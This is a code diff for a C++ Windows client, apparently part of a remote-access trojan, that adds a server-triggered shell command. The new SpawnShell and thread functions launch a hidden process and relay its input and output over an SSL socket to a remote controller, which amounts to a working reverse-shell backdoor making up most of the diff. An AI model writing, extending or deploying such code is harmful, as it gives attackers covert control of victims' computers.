@@ -1,7 +1,6 @@
 #include "Client.hpp"
 #include "Commands.hpp"
 #include "Misc.hpp"
-#include "Info.hpp"
 
 bool Client::CheckSslReturnCode(int iRet){
 	int iTmp = SSL_get_error(sslSocket, iRet);
@@ -279,6 +278,10 @@ bool Client::ParseCommand(char*& strCommand){
 			}
 			goto release;
 		}
+		if(vcCommands[0] == CommandCodes::cShell){
+			SpawnShell(vcCommands[1].c_str());
+			goto release;
+		}
 	} else {
 		#ifdef _DEBUG
 		std::cout<<"Error parsing command, raw data:\n----------\n"<<strCommand<<"\n---------n";
@@ -353,6 +356,179 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 	return true;
 }
 
+void Client::SpawnShell(const std::string strCmd){
+	#ifdef _DEBUG
+	std::cout<<"Spawning "<<strCmd<<"\n";
+	#endif
+	if(!Misc::FileExists(strCmd.c_str())){
+		#ifdef _DEBUG
+		std::cout<<"File "<<strCmd<<" doesnt exist\n";
+		#endif
+		SendError(CommandCodes::cShellError);
+		return;
+	}
+	
+   PROCESS_INFORMATION pi;
+   HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
+   stdinRd = stdinWr = stdoutRd = stdoutWr = nullptr;
+   SECURITY_ATTRIBUTES sa;
+   sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+   sa.lpSecurityDescriptor =  nullptr;
+   sa.bInheritHandle = true;
+   if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)){
+      #ifdef _DBG
+	  std::cout<<"Error creating pipes\n";
+	  error();
+	  #endif
+	  SendError(CommandCodes::cShellError);
+      return;                      
+   }
+   STARTUPINFO si; 
+   GetStartupInfo(&si);
+   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+   si.wShowWindow = SW_HIDE;
+   si.hStdOutput = stdoutWr;
+   si.hStdError = stdoutWr;
+   si.hStdInput = stdinRd;
+   char cCmd[1024];
+   strncpy(cCmd, strCmd.c_str(), 1023);
+   if(CreateProcess(nullptr, cCmd, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi) == 0){
+      #ifdef _DBG
+	  std::cout<<"Unable to spawn shell\n";
+	  error();
+	  #endif
+	  SendError(CommandCodes::cShellError);
+      return;                        
+   }
+   if(SendError(CommandCodes::cShellRunning) == 0){
+	   isRunningShell = true;
+   } else {
+	   isRunningShell = false;
+   }
+   std::thread tRead(&Client::threadReadShell, this, stdoutRd);
+   std::thread tWrite(&Client::threadWriteShell, this, stdinWr);
+   tRead.join();
+   tWrite.join();
+   SendError(CommandCodes::cShellEnd);
+   TerminateProcess(pi.hProcess, 0);
+   if(stdinRd != nullptr){
+		CloseHandle(stdinRd);
+		stdinRd = nullptr;
+	} 
+	if(stdinWr != nullptr){
+		CloseHandle(stdinWr);
+		stdinWr = nullptr;
+	} 
+	if(stdoutRd != nullptr){
+		CloseHandle(stdoutRd);
+		stdoutRd = nullptr;
+	} 
+	if(stdoutWr != nullptr){
+		CloseHandle(stdoutWr);
+		stdoutWr = nullptr;
+	}
+	isRunningShell = false;
+}
+
+void Client::threadReadShell(HANDLE hPipe){
+	int iLen = 0, iRet = 0;
+	char cBuffer[512], cBuffer2[512 * 2 + 30];
+	DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
+	BYTE bPChar = 0;
+	while(isRunningShell){
+		if(PeekNamedPipe(hPipe, cBuffer, 512, &dBytesReaded, nullptr, nullptr)){
+			if(dBytesReaded > 0){
+				ReadFile(hPipe, cBuffer, 512, &dBytesReaded, nullptr);
+			} else {
+				Sleep(100);
+				continue;
+			}
+			for(dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++){
+				if(cBuffer[dBufferC] == '\n' && bPChar != '\r'){
+					cBuffer2[dBytesToWrite++] = '\r';
+				}
+				bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
+			}
+			cBuffer2[dBytesToWrite] = '\0';
+			iLen = strlen(cBuffer2);
+			TryAgain:
+			iRet = SSL_write(sslSocket, cBuffer2, iLen);
+			if(iRet <= 0){
+				if(!CheckSslReturnCode(iRet)){
+					mtxMutex.lock();
+					isRunningShell = false;
+					mtxMutex.unlock();
+					break;
+				}
+				Sleep(2000);
+				goto TryAgain;
+			}
+		} else {
+			#ifdef _DEBUG
+			std::cout<<"PeekNamedPipe error\n";
+			error();
+			#endif
+			mtxMutex.lock();
+			isRunningShell = false;
+			mtxMutex.unlock();
+			break;
+		}
+	}
+	#ifdef _DEBUG
+	std::cout<<"Stop reading from shell\n";
+	error();
+	#endif
+}
+
+void Client::threadWriteShell(HANDLE hPipe){
+	int iRet = 0;
+	char cRecvBytes[1], cBuffer[2048];
+	DWORD dBytesWrited = 0, dBufferC = 0;
+	while(isRunningShell){
+		iRet = SSL_read(sslSocket, cRecvBytes, 1);
+		if(iRet <= 0){
+			if(!CheckSslReturnCode(iRet)){
+				mtxMutex.lock();
+				isRunningShell = false;
+				mtxMutex.unlock();
+				break;
+			}
+			Sleep(2000);
+			continue;
+		}
+		cBuffer[dBufferC++] = cRecvBytes[0];
+		if(cRecvBytes[0] == '\r'){
+			cBuffer[dBufferC++] = '\n';
+		}
+		if(strncmp(cBuffer, "exit", 4) == 0){ 
+			mtxMutex.lock();
+			isRunningShell = false;
+			mtxMutex.unlock();
+			break;
+		}
+		if(cRecvBytes[0] == '\n' || cRecvBytes[0] == '\r' || dBufferC > 2047){
+			if(!WriteFile(hPipe, cBuffer, dBufferC, &dBytesWrited, nullptr)){
+				#ifdef _DEBUG
+				std::cout<<"Error writing to pipe\n";
+				error();
+				#endif
+				mtxMutex.lock();
+				isRunningShell = false;
+				mtxMutex.unlock();
+				break;
+			}
+			#ifdef _DEBUG
+			std::cout<<"Writed "<<dBytesWrited<<" bytes\n";
+			#endif
+			dBufferC = 0;
+		}
+	}
+	#ifdef _DEBUG
+	std::cout<<"Stop writing to shell\n";
+	error();
+	#endif
+}
+
 void Client::CloseConnection(){
 	if(sslCTX){
 		SSL_CTX_free(sslCTX);
@@ -363,4 +539,23 @@ void Client::CloseConnection(){
 		bioRemote = nullptr;
 	}
 	sslSocket = nullptr;
+}
+
+int Client::SendError(const char* cCode){
+	int cLen = strlen(cCode), itRet = 0;
+	TryAgain0:
+	itRet = SSL_write(sslSocket, cCode, cLen);
+	if(itRet <= 0){
+		if(!CheckSslReturnCode(itRet)){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send command to server\n";
+			error();
+			return -1;
+			#endif
+		} else {
+			Sleep(100);
+			goto TryAgain0;
+		}
+	}
+	return 0;
 }
